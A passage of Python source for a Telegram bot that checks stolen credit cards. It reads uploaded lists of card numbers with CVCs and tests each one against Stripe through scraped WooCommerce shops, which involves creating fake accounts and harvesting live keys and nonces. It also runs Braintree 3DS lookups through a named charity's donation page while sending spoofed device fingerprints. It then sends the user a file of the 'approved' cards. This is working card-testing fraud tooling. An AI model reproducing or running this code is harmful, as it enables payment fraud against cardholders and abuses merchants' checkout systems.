        payload = attach_resp.json()
        if attach_resp.status_code == 200 and payload.get('success'):
            status = payload.get('data', {}).get('status', '')
            if status == 'succeeded':
                elapsed = round(time.time() - start_time, 2)
                return format_stripe_result("", num_clean, mon, year2, cvc, elapsed, bin_info, "approved")
            else:
                return format_stripe_result(f"Status: {status}", num_clean, mon, year2, cvc, round(time.time() - start_time, 2), bin_info, "declined")
        else:
            error_msg = payload.get('data', {}).get('error', {}).get('message', 'Declined')
            return format_stripe_result(f"{error_msg}", num_clean, mon, year2, cvc, round(time.time() - start_time, 2), bin_info, "declined")
    except:
        return format_stripe_result("Parse error", num_clean, mon, year2, cvc, round(time.time() - start_time, 2), bin_info, "declined")

def scan_file_background_stripe(message, file_path, original_filename, user_id):
    scanning_sessions[user_id] = {
        'active': True, 
        'stop': False,
        'approved': 0,
        'declined': 0,
        'total': 0,
        'elapsed': 0,
        'current_card': "Waiting...",
        'current_status': "⏳ Starting...",
        'approved_cards': []
    }
    
    try:
        cards = []
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split('|')
                if len(parts) != 4:
                    continue
                num, mon, year, cvc = parts
                num = num.replace(' ', '')
                mon = mon.zfill(2)
                if len(year) == 4 and year.startswith('20'):
                    year2 = year[2:]
                else:
                    year2 = year[-2:]
                cards.append((num, mon, year2, cvc))
        
        os.remove(file_path)
        
        if not cards:
            bot.send_message(message.chat.id, "❌ File is empty or invalid format.")
            scanning_sessions[user_id]['active'] = False
            return
        
        total = len(cards)
        approved = 0
        declined = 0
        errors = 0
        start_time = time.time()
        current_card = "Waiting..."
        current_status = "⏳ Starting..."
        approved_cards = []
        
        scanning_sessions[user_id]['total'] = total
        scanning_sessions[user_id]['approved_cards'] = approved_cards
        
        markup = create_scan_buttons_stripe(
            current_card,
            current_status,
            approved,
            declined,
            total
        )
        
        status_msg = bot.send_message(
            message.chat.id,
            f"📁 File: {original_filename}\n"
            f"⚡ Gateway: Stripe\n"
            f"⏳ Time: 0s\n"
            f"🕐 {datetime.now().strftime('%I:%M %p')}",
            reply_markup=markup,
            parse_mode="HTML"
        )
        
        scanning_sessions[user_id]['message_id'] = status_msg.message_id
        
        for idx, (num, mon, year2, cvc) in enumerate(cards, 1):
            if scanning_sessions[user_id].get('stop', False):
                bot.send_message(
                    message.chat.id,
                    f"⏹ Scan stopped at {idx-1}/{total} cards."
                )
                break
            
            card_display = f"{num}|{mon}|20{year2}|{cvc}"
            current_card = card_display
            scanning_sessions[user_id]['current_card'] = current_card
            
            try:
                result = scan_single_card_stripe(num, mon, year2, cvc)
                
                if "✅" in result:
                    approved += 1
                    current_status = "Approved ✅"
                    approved_cards.append(card_display)
                    scanning_sessions[user_id]['approved_cards'] = approved_cards
                    bot.send_message(message.chat.id, result, parse_mode="HTML")
                elif "❌" in result:
                    declined += 1
                    current_status = "Declined ❌"
                else:
                    errors += 1
                    current_status = "⚠️ Error"
                
                scanning_sessions[user_id]['approved'] = approved
                scanning_sessions[user_id]['declined'] = declined
                scanning_sessions[user_id]['current_status'] = current_status
                
            except Exception as e:
                errors += 1
                current_status = "❌ Error"
            
            elapsed = round(time.time() - start_time, 2)
            scanning_sessions[user_id]['elapsed'] = elapsed
            
            new_markup = create_scan_buttons_stripe(
                current_card,
                current_status,
                approved,
                declined,
                total
            )
            
            try:
                bot.edit_message_text(
                    f"📁 File: {original_filename}\n"
                    f"⚡ Gateway: Stripe\n"
                    f"⏳ Time: {elapsed}s\n"
                    f"🕐 {datetime.now().strftime('%I:%M %p')}",
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    reply_markup=new_markup,
                    parse_mode="HTML"
                )
            except:
                pass
            
            time.sleep(random.uniform(1, 2))
        
        elapsed = round(time.time() - start_time, 2)
        scanning_sessions[user_id]['elapsed'] = elapsed
        
        if approved_cards:
            approved_content = '\n'.join(approved_cards)
            output_file = io.BytesIO()
            output_file.write(approved_content.encode('utf-8'))
            output_file.seek(0)
            
            bot.send_document(
                message.chat.id,
                output_file,
                visible_file_name=f'approved_{original_filename}',
                caption=f"✅ Approved Cards: {len(approved_cards)}"
            )
        else:
            bot.send_message(
                message.chat.id,
                "❌ No approved cards found."
            )
        
        final_markup = create_scan_buttons_stripe(
            "✅ Completed",
            "Done",
            approved,
            declined,
            total,
            show_stop=False
        )
        
        if not scanning_sessions[user_id].get('stop', False):
            final_msg = (
                f"✅ Scan Completed!\n\n"
                f"📁 File: {original_filename}\n"
                f"⚡ Gateway: Stripe\n"
                f"⏱️ Time: {elapsed}s\n\n"
                f"✅ Approved: {approved}\n"
                f"❌ Declined: {declined}\n"
                f"⚠️ Errors: {errors}\n"
                f"📊 Total: {total}"
            )
        else:
            final_msg = (
                f"⏹ Scan Stopped!\n\n"
                f"📁 File: {original_filename}\n"
                f"⚡ Gateway: Stripe\n"
                f"⏱️ Time: {elapsed}s\n\n"
                f"✅ Approved: {approved}\n"
                f"❌ Declined: {declined}\n"
                f"⚠️ Errors: {errors}\n"
                f"📊 Total: {total}"
            )
        
        try:
            bot.edit_message_text(
                final_msg,
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                reply_markup=final_markup,
                parse_mode="HTML"
            )
        except:
            bot.send_message(message.chat.id, final_msg, reply_markup=final_markup, parse_mode="HTML")
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
    finally:
        scanning_sessions[user_id]['active'] = False

# ======================================================
# ===== دوال إنشاء الأزرار Stripe 1 =====
# ======================================================

def create_scan_buttons_stripe(card_number, status, approved, declined, total, show_stop=True):
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    btn_card = types.InlineKeyboardButton(
        f"💳 {card_number}", 
        callback_data="stripe_card"
    )
    markup.add(btn_card)
    
    btn_status = types.InlineKeyboardButton(
        f"📨 {status}", 
        callback_data="stripe_status"
    )
    markup.add(btn_status)
    
    btn_approved = types.InlineKeyboardButton(
        f"✅ Approved: {approved}", 
        callback_data="stripe_approved"
    )
    btn_declined = types.InlineKeyboardButton(
        f"❌ Declined: {declined}", 
        callback_data="stripe_declined"
    )
    markup.add(btn_approved, btn_declined)
    
    btn_total = types.InlineKeyboardButton(
        f"📊 Total: {total}", 
        callback_data="stripe_total"
    )
    markup.add(btn_total)
    
    if show_stop:
        btn_stop = types.InlineKeyboardButton(
            "⏹️ Stop Scan", 
            callback_data="stripe_stop"
        )
        markup.add(btn_stop)
    
    return markup

# ======================================================
# ===== دوال بوابة Stripe 2 (متعددة المواقع) =====
# ======================================================

def create_session_stripe2():
    s = requests.Session()
    s.headers.update({'user-agent': generate_user_agent()})
    return s

def check_bin_stripe2(bin_number, session):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    try:
        resp = session.get(url, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            return {
                "level": data.get("level", "Unknown"),
                "brand": data.get("brand", "Unknown"),
                "type": data.get("type", "Unknown"),
                "bank": data.get("bank", "Unknown"),
                "country": data.get("country_name", "Unknown"),
                "flag": data.get("country_flag", "🏳️"),
                "bin": bin_number
            }
    except:
        pass
    return None

def format_stripe2_result(status, card_str, start_time, bin_info, result_type):
    parts = card_str.split("|")
    num = parts[0] if len(parts) > 0 else "N/A"
    mon = parts[1] if len(parts) > 1 else "N/A"
    year2 = parts[2] if len(parts) > 2 else "N/A"
    cvc = parts[3] if len(parts) > 3 else "N/A"
    elapsed = round(time.time() - start_time, 2)
    
    if result_type == "approved":
        title = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅"
        response = "<code>succeeded</code>"
    elif result_type == "declined":
        title = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌"
        if status and "❌" not in str(status):
            response = f"<code>{status}</code>"
        else:
            response = "<code>declined</code>"
    else:
        title = "⚠️ System Error"
        response = f"<code>{status}</code>"
    
    if bin_info:
        bin_line = f"{bin_info['bin']} - {bin_info['type']} - {bin_info['brand']} - {bin_info['level']}"
        bank_line = f"{bin_info['bank']}"
        country_line = f"{bin_info['country']} - {bin_info['flag']}"
    else:
        bin_line = "N/A"
        bank_line = "N/A"
        country_line = "N/A - 🏳️"
    
    return (f"{title}\n\n"
            f"𝐂𝐚𝐫𝐝 ➙ <code>{num}|{mon}|20{year2}|{cvc}</code>\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➙ Stripe Multi-Site\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➙ {response}\n\n"
            f"𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ➙ : {bin_line}\n"
            f"𝐁𝐚𝐧𝐤 ➙ {bank_line}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➙ {country_line}\n\n"
            f"𝗧𝗼𝗼𝗸 : <code>{elapsed}</code> (seconds) PREMIUM")

def st2_check(ccx, start_time):
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) != 4:
        return format_stripe2_result("Invalid format", ccx, start_time, None, "declined")
    n, mm, yy, cvc = parts
    cvc = cvc.strip()
    if "20" in yy:
        yy = yy.split("20")[1]

    link = random.choice(LINKS_LIST)
    user = generate_user_agent()
    r = requests.Session()
    headers = {'user-agent': user}
    
    try:
        res = r.get(url=f"{link}/my-account/", headers=headers, timeout=30).text
    except:
        return format_stripe2_result("Connection error", ccx, start_time, None, "declined")
    
    reg2 = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', res)
    if not reg2:
        return format_stripe2_result("Page not found", ccx, start_time, None, "declined")
    reg = reg2.group(1)
    
    username = f'u_{uuid.uuid4().hex[:8]}'
    email = f'u_{uuid.uuid4().hex[:8]}@gmail.com'
    password = f'P_{uuid.uuid4().hex[:8]}!'
    data = {
        'username': username, 
        'email': email, 
        'password': password, 
        'woocommerce-register-nonce': reg, 
        'register': 'Register'
    }
    
    try:
        res2 = r.post(url=f"{link}/my-account/", headers=headers, data=data, timeout=30).text
        res3 = r.get(url=f"{link}/my-account/add-payment-method/", headers=headers, timeout=30)
    except:
        return format_stripe2_result("Registration failed", ccx, start_time, None, "declined")
    
    pk_live2 = re.search(r'(pk_live_[A-Za-z0-9_-]+)', res3.text)
    if not pk_live2:
        return format_stripe2_result("PK key not found", ccx, start_time, None, "declined")
    pk_live = pk_live2.group(1)
    
    acct2 = re.search(r'(acct_[A-Za-z0-9_-]+)', res3.text)
    acct = f'&_stripe_account={acct2.group(1)}' if acct2 else ''
    
    addnonce2 = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', res3.text)
    addnonce3 = re.search(r'"createSetupIntentNonce":"(.*?)"', res3.text)
    if addnonce2:
        addnonce = addnonce2.group(1)
    elif addnonce3:
        addnonce = addnonce3.group(1)
    else:
        return format_stripe2_result("Nonce not found", ccx, start_time, None, "declined")
    
    stripe_headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': user
    }
    
    data_stripe = (
        f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}'
        f'&card[exp_month]={mm}&allow_redisplay=unspecified'
        f'&billing_details[address][postal_code]=10080'
        f'&billing_details[address][country]=US'
        f'&payment_user_agent=stripe.js%2F6c35f76878%3B+stripe-js-v3%2F6c35f76878%3B+payment-element%3B+deferred-intent'
        f'&key={pk_live}{acct}'
    )
    
    try:
        res4 = r.post('https://api.stripe.com/v1/payment_methods', data=data_stripe, headers=stripe_headers, timeout=30).json()
    except:
        return format_stripe2_result("Stripe API error", ccx, start_time, None, "declined")
    
    if 'id' not in res4:
        err = res4.get('error', {}).get('message', 'Payment method creation failed')
        return format_stripe2_result(err, ccx, start_time, None, "declined")
    payment_id = res4['id']
    
    final_headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': f'{link}/my-account/add-payment-method/',
        'Origin': link,
        'user-agent': user
    }
    
    data_final = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': payment_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': addnonce
    }
    
    try:
        r5r = r.post(f'{link}/wp-admin/admin-ajax.php', data=data_final, headers=final_headers, timeout=30)
        r5 = r5r.text
    except:
        return format_stripe2_result("Admin-ajax error", ccx, start_time, None, "declined")
    
    bin_number = n[:6] if len(n) >= 6 else "N/A"
    bin_info = check_bin_stripe2(bin_number, r) if bin_number != "N/A" else None
    
    if 'Your card was declined.' in r5 or 'Your card could not be set up for future usage.' in r5:
        return format_stripe2_result("Your card was declined.", ccx, start_time, bin_info, "declined")
    elif 'success' in r5.lower() or 'Success' in r5:
        return format_stripe2_result("Approved ✅", ccx, start_time, bin_info, "approved")
    elif 'Your card number is incorrect.' in r5:
        return format_stripe2_result("Your card number is incorrect.", ccx, start_time, bin_info, "declined")
    else:
        try:
            err_msg = r5r.json().get('data', {}).get('error', {}).get('message', r5)
            return format_stripe2_result(err_msg, ccx, start_time, bin_info, "declined")
        except:
            return format_stripe2_result(r5[:100], ccx, start_time, bin_info, "declined")

def scan_single_card_stripe2(num, mon, year2, cvc):
    start_time = time.time()
    ccx = f"{num}|{mon}|{year2}|{cvc}"
    return st2_check(ccx, start_time)

def create_scan_buttons_stripe2(card_number, status, approved, declined, total, show_stop=True):
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    btn_card = types.InlineKeyboardButton(
        f"💳 {card_number}", 
        callback_data="stripe2_card"
    )
    markup.add(btn_card)
    
    btn_status = types.InlineKeyboardButton(
        f"📨 {status}", 
        callback_data="stripe2_status"
    )
    markup.add(btn_status)
    
    btn_approved = types.InlineKeyboardButton(
        f"✅ Approved: {approved}", 
        callback_data="stripe2_approved"
    )
    btn_declined = types.InlineKeyboardButton(
        f"❌ Declined: {declined}", 
        callback_data="stripe2_declined"
    )
    markup.add(btn_approved, btn_declined)
    
    btn_total = types.InlineKeyboardButton(
        f"📊 Total: {total}", 
        callback_data="stripe2_total"
    )
    markup.add(btn_total)
    
    if show_stop:
        btn_stop = types.InlineKeyboardButton(
            "⏹️ Stop Scan", 
            callback_data="stripe2_stop"
        )
        markup.add(btn_stop)
    
    return markup

def scan_file_background_stripe2(message, file_path, original_filename, user_id):
    stripe2_sessions[user_id] = {
        'active': True,
        'stop': False,
        'approved': 0,
        'declined': 0,
        'total': 0,
        'elapsed': 0,
        'current_card': "Waiting...",
        'current_status': "⏳ Starting...",
        'approved_cards': []
    }
    
    try:
        cards = []
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split('|')
                if len(parts) != 4:
                    continue
                num, mon, year, cvc = parts
                num = num.replace(' ', '')
                mon = mon.zfill(2)
                if len(year) == 4 and year.startswith('20'):
                    year2 = year[2:]
                else:
                    year2 = year[-2:]
                cards.append((num, mon, year2, cvc))
        
        os.remove(file_path)
        
        if not cards:
            bot.send_message(message.chat.id, "❌ File is empty or invalid format.")
            stripe2_sessions[user_id]['active'] = False
            return
        
        total = len(cards)
        approved = 0
        declined = 0
        errors = 0
        start_time = time.time()
        current_card = "Waiting..."
        current_status = "⏳ Starting..."
        approved_cards = []
        
        stripe2_sessions[user_id]['total'] = total
        stripe2_sessions[user_id]['approved_cards'] = approved_cards
        
        markup = create_scan_buttons_stripe2(
            current_card,
            current_status,
            approved,
            declined,
            total
        )
        
        status_msg = bot.send_message(
            message.chat.id,
            f"📁 File: {original_filename}\n"
            f"⚡ Gateway: Stripe Multi-Site\n"
            f"⏳ Time: 0s\n"
            f"🕐 {datetime.now().strftime('%I:%M %p')}",
            reply_markup=markup,
            parse_mode="HTML"
        )
        
        stripe2_sessions[user_id]['message_id'] = status_msg.message_id
        
        for idx, (num, mon, year2, cvc) in enumerate(cards, 1):
            if stripe2_sessions[user_id].get('stop', False):
                bot.send_message(
                    message.chat.id,
                    f"⏹ Scan stopped at {idx-1}/{total} cards."
                )
                break
            
            card_display = f"{num}|{mon}|20{year2}|{cvc}"
            current_card = card_display
            stripe2_sessions[user_id]['current_card'] = current_card
            
            try:
                result = scan_single_card_stripe2(num, mon, year2, cvc)
                
                if "✅" in result:
                    approved += 1
                    current_status = "Approved ✅"
                    approved_cards.append(card_display)
                    stripe2_sessions[user_id]['approved_cards'] = approved_cards
                    bot.send_message(message.chat.id, result, parse_mode="HTML")
                elif "❌" in result:
                    declined += 1
                    current_status = "Declined ❌"
                else:
                    errors += 1
                    current_status = "⚠️ Error"
                
                stripe2_sessions[user_id]['approved'] = approved
                stripe2_sessions[user_id]['declined'] = declined
                stripe2_sessions[user_id]['current_status'] = current_status
                
            except Exception as e:
                errors += 1
                current_status = "❌ Error"
            
            elapsed = round(time.time() - start_time, 2)
            stripe2_sessions[user_id]['elapsed'] = elapsed
            
            new_markup = create_scan_buttons_stripe2(
                current_card,
                current_status,
                approved,
                declined,
                total
            )
            
            try:
                bot.edit_message_text(
                    f"📁 File: {original_filename}\n"
                    f"⚡ Gateway: Stripe Multi-Site\n"
                    f"⏳ Time: {elapsed}s\n"
                    f"🕐 {datetime.now().strftime('%I:%M %p')}",
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    reply_markup=new_markup,
                    parse_mode="HTML"
                )
            except:
                pass
            
            time.sleep(random.uniform(1, 2))
        
        elapsed = round(time.time() - start_time, 2)
        stripe2_sessions[user_id]['elapsed'] = elapsed
        
        if approved_cards:
            approved_content = '\n'.join(approved_cards)
            output_file = io.BytesIO()
            output_file.write(approved_content.encode('utf-8'))
            output_file.seek(0)
            
            bot.send_document(
                message.chat.id,
                output_file,
                visible_file_name=f'stripe2_approved_{original_filename}',
                caption=f"✅ Approved Cards: {len(approved_cards)}"
            )
        else:
            bot.send_message(
                message.chat.id,
                "❌ No approved cards found."
            )
        
        final_markup = create_scan_buttons_stripe2(
            "✅ Completed",
            "Done",
            approved,
            declined,
            total,
            show_stop=False
        )
        
        if not stripe2_sessions[user_id].get('stop', False):
            final_msg = (
                f"✅ Scan Completed!\n\n"
                f"📁 File: {original_filename}\n"
                f"⚡ Gateway: Stripe Multi-Site\n"
                f"⏱️ Time: {elapsed}s\n\n"
                f"✅ Approved: {approved}\n"
                f"❌ Declined: {declined}\n"
                f"⚠️ Errors: {errors}\n"
                f"📊 Total: {total}"
            )
        else:
            final_msg = (
                f"⏹ Scan Stopped!\n\n"
                f"📁 File: {original_filename}\n"
                f"⚡ Gateway: Stripe Multi-Site\n"
                f"⏱️ Time: {elapsed}s\n\n"
                f"✅ Approved: {approved}\n"
                f"❌ Declined: {declined}\n"
                f"⚠️ Errors: {errors}\n"
                f"📊 Total: {total}"
            )
        
        try:
            bot.edit_message_text(
                final_msg,
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                reply_markup=final_markup,
                parse_mode="HTML"
            )
        except:
            bot.send_message(message.chat.id, final_msg, reply_markup=final_markup, parse_mode="HTML")
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
    finally:
        stripe2_sessions[user_id]['active'] = False

# ======================================================
# ===== دوال VBV (Braintree) =====
# ======================================================

PASSED_STATUSES = (
    'authenticate_successful',
    'authenticate_attempt_successful',
    'authenticate_frictionless_failed',
)

def _request_vbv(method, url, timeout=25, **kwargs):
    for attempt in range(2):
        try:
            with httpx.Client(timeout=timeout, follow_redirects=True) as client:
                if method == "GET":
                    r = client.get(url, **kwargs)
                else:
                    r = client.post(url, **kwargs)
                return r
        except Exception:
            if attempt == 1:
                return None

def get_bin_info_vbv(bin_number):
    try:
        url = f"https://bins.antipublic.cc/bins/{bin_number}"
        resp = httpx.get(url, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return {
                "brand": data.get("brand", "Unknown"),
                "type": data.get("type", "Unknown"),
                "level": data.get("level", "Unknown"),
                "bank": data.get("bank", "Unknown"),
                "country": data.get("country_name", "Unknown"),
                "flag": data.get("country_flag", "🏳️"),
                "country_code": data.get("country_code", "N/A"),
                "bin": bin_number
            }
    except:
        pass
    return None

def check_vbv(card_number, exp_month, exp_year, cvc):
    yy = exp_year
    if len(str(yy)) == 4 and "20" in str(yy):
        yy = str(yy).split("20")[1]
    elif len(str(yy)) == 4:
        yy = str(yy)[2:]

    sessionId = str(uuid.uuid4())
    zpReferenceId = f"0_{uuid.uuid4()}"

    bin_number = card_number[:6]
    bin_info = get_bin_info_vbv(bin_number)

    try:
        sess = httpx.Client(timeout=30.0, follow_redirects=True)

        sess.get("https://oxfordshireanimalsanctuary.org.uk/donate/donate-a-different-amount/")
        resp = sess.post(
            "https://oxfordshireanimalsanctuary.org.uk/checkout/",
            headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537"},
            data={"nyp": "5.00", "add-to-cart": "9395"}
        )
        match = re.search(r'"client_token_nonce":"(\w+)"', resp.text)
        if not match:
            sess.close()
            return "error", {"error": "Failed to get client_token_nonce", "bin_info": bin_info}
        nonce = match.group(1)

        headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://oxfordshireanimalsanctuary.org.uk',
            'referer': 'https://oxfordshireanimalsanctuary.org.uk/checkout/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {'action': 'wc_braintree_paypal_get_client_token', 'nonce': nonce}
        resp = sess.post('https://oxfordshireanimalsanctuary.org.uk/wp-admin/admin-ajax.php', headers=headers, data=data)
        
        if resp.status_code not in (200, 201):
            sess.close()
            return "error", {"error": f"Authorization fingerprint failed: HTTP {resp.status_code}", "bin_info": bin_info}
        
        try:
            decoded = json.loads(base64.b64decode(resp.json()['data']).decode('utf-8'))
            authprint = decoded['authorizationFingerprint']
        except Exception:
            sess.close()
            return "error", {"error": "Failed to decode authorization fingerprint", "bin_info": bin_info}

        fp_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0',
            'Accept': '*/*',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://geo.cardinalcommerce.com',
            'referer': f'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5c896cd2791eef31e82d5e04&tmEventType=PAYMENT&referenceId={zpReferenceId}&geolocation=false&origin=Songbird',
        }
        fp_data = {
            'Cookies': {'Legacy': True, 'LocalStorage': True, 'SessionStorage': True},
            'DeviceChannel': 'Browser',
            'Extended': {
                'Browser': {'Adblock': False, 'AvailableJsFonts': [], 'DoNotTrack': 'unspecified', 'JavaEnabled': False},
                'Device': {'ColorDepth': 24, 'Cpu': 'unknown', 'Platform': 'Windows', 'TouchSupport': {'MaxTouchPoints': 0, 'OnTouchStartAvailable': False, 'TouchEventCreationSuccessful': False}},
            },
            'Fingerprint': '479f42e3f0db1edc5f6ff6f9603d69fa',
            'FingerprintingTime': 196,
            'FingerprintDetails': {'Version': '1.5.1'},
            'Language': 'en-US',
            'OrgUnitId': '5c896cd2791eef31e82d5e04',
            'Origin': 'Songbird',
            'Plugins': ['PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf'],
            'ReferenceId': zpReferenceId,
            'Referrer': 'https://oxfordshireanimalsanctuary.org.uk/',
            'Screen': {'FakedResolution': False, 'Ratio': 1.7777777777777777, 'Resolution': '1920x1080', 'UsableResolution': '1920x1080', 'CCAScreenSize': '01'},
            'ThreatMetrixEnabled': False,
            'ThreatMetrixEventType': 'PAYMENT',
            'ThreatMetrixAlias': 'Default',
            'TimeOffset': 0,
            'UserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0',
            'UserAgentDetails': {'FakedOS': False, 'FakedBrowser': False},
        }
        sess.post('https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData', headers=fp_headers, json=fp_data)

        bt_headers = {
            'accept': '*/*',
            'authorization': f'Bearer {authprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
        }
        query = '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
            tokenizeCreditCard(input: $input) {
                token
                creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear
                    binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } }
            } }'''
        bt_data = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': sessionId},
            'query': query,
            'variables': {'input': {'creditCard': {'number': card_number, 'expirationMonth': exp_month, 'expirationYear': yy, 'cvv': cvc}, 'options': {'validate': False}}},
            'operationName': 'TokenizeCreditCard',
        }
        resp = _request_vbv("POST", 'https://payments.braintree-api.com/graphql', json=bt_data, headers=bt_headers)
        if not resp or resp.status_code not in (200, 201):
            sess.close()
            return "error", {"error": "Tokenization failed", "bin_info": bin_info}
        
        try:
            j = resp.json()
            token = j['data']['tokenizeCreditCard']['token']
            cc_data = j['data']['tokenizeCreditCard']['creditCard']
            bin_info_update = {
                "brand": cc_data.get('brandCode', 'UNKNOWN').upper(),
                "type": "DEBIT" if cc_data.get('binData', {}).get('debit') == "Yes" else "CREDIT",
                "level": cc_data.get('binData', {}).get('productId', 'UNKNOWN'),
                "bank": cc_data.get('binData', {}).get('issuingBank', 'UNKNOWN') or 'UNKNOWN',
                "country": cc_data.get('binData', {}).get('countryOfIssuance', 'UNKNOWN') or 'UNKNOWN',
            }
            if bin_info:
                bin_info.update(bin_info_update)
            else:
                bin_info = bin_info_update
        except Exception:
            sess.close()
            return "error", {"error": "Failed to parse tokenization response", "bin_info": bin_info}

        ds_headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://oxfordshireanimalsanctuary.org.uk',
            'referer': 'https://oxfordshireanimalsanctuary.org.uk/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
        }
        ds_data = {
            'amount': '1.00',
            'additionalInfo': {
                'billingLine1': 'Los Angeles', 'billingLine2': 'Los Angeles', 'billingCity': 'Los Angeles',
                'billingState': 'NY', 'billingPostalCode': '10080', 'billingCountryCode': 'US',
                'billingGivenName': 'FINAL', 'billingSurname': 'AINZ', 'email': 'tahanmare0@gmail.com',
            },
            'challengeRequested': True,
            'bin': token[:6],
            'dfReferenceId': zpReferenceId,
            'clientMetadata': {
                'requestedThreeDSecureVersion': '2', 'sdkVersion': 'web/3.129.1',
                'cardinalDeviceDataCollectionTimeElapsed': 1587,
                'issuerDeviceDataCollectionTimeElapsed': 11415,
                'issuerDeviceDataCollectionResult': False,
            },
            'authorizationFingerprint': authprint,
            'braintreeLibraryVersion': 'braintree/web/3.129.1',
            '_meta': {
                'merchantAppId': 'oxfordshireanimalsanctuary.org.uk', 'platform': 'web',
                'sdkVersion': '3.129.1', 'source': 'client', 'integration': 'custom',
                'integrationType': 'custom', 'sessionId': sessionId,
            },
        }
        url = f'https://api.braintreegateway.com/merchants/h6mb65mhhtfy6f9x/client_api/v1/payment_methods/{token}/three_d_secure/lookup'
        resp = _request_vbv("POST", url, json=ds_data, headers=ds_headers)
        sess.close()
        
        if not resp or resp.status_code not in (200, 201):
            return "error", {"error": f"3DS lookup failed: HTTP {resp.status_code if resp else 'none'}", "bin_info": bin_info}

        try:
            result = resp.json()
            pm = result.get('paymentMethod', {})
            three_ds = pm.get('threeDSecureInfo', {})
            ds_status = three_ds.get('status', 'unknown')
            nonce_val = pm.get('nonce', '')

            result_out = {
                "status": ds_status,
                "nonce": nonce_val,
                "token": token,
                "sessionId": sessionId,
                "zpReferenceId": zpReferenceId,
                "bin_info": bin_info,
            }

            if ds_status.lower() in PASSED_STATUSES:
                return "passed", result_out
            elif ds_status:
                return "failed", result_out
            else:
                return "error", result_out
        except Exception:
            return "error", {"error": "Failed to parse 3DS response", "bin_info": bin_info}

    except Exception as e:
        return "error", {"error": str(e)[:200], "bin_info": bin_info}

def format_vbv_result(status, result, card_num, mon, year, cvc, elapsed):
    bin_info = result.get('bin_info', {})
    
    if status == "passed":
        title = "✅ VBV PASSED"
        response = f"<code>{result.get('status', 'Success')}</code>"
    elif status == "failed":
        title = "❌ VBV FAILED"
        response = f"<code>{result.get('status', 'Declined')}</code>"
    else:
        title = "⚠️ VBV ERROR"
        response = f"<code>{result.get('error', 'Unknown error')}</code>"
    
    brand = bin_info.get('brand', 'N/A')
    card_type = bin_info.get('type', 'N/A')
    level = bin_info.get('level', 'N/A')
    bank = bin_info.get('bank', 'N/A')
    country = bin_info.get('country', 'N/A')
    flag = bin_info.get('flag', '🏳️')
    bin_number = bin_info.get('bin', card_num[:6])
    
    bin_line = f"{bin_number} - {card_type} - {brand} - {level}"
    bank_line = bank
    country_line = f"{country} {flag}"
    
    return (f"{title}\n\n"
            f"𝐂𝐚𝐫𝐝 ➙ <code>{card_num}|{mon}|{year}|{cvc}</code>\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➙ Braintree (VBV)\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➙ {response}\n\n"
            f"𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ➙ : {bin_line}\n"
            f"𝐁𝐚𝐧𝐤 ➙ {bank_line}\n"
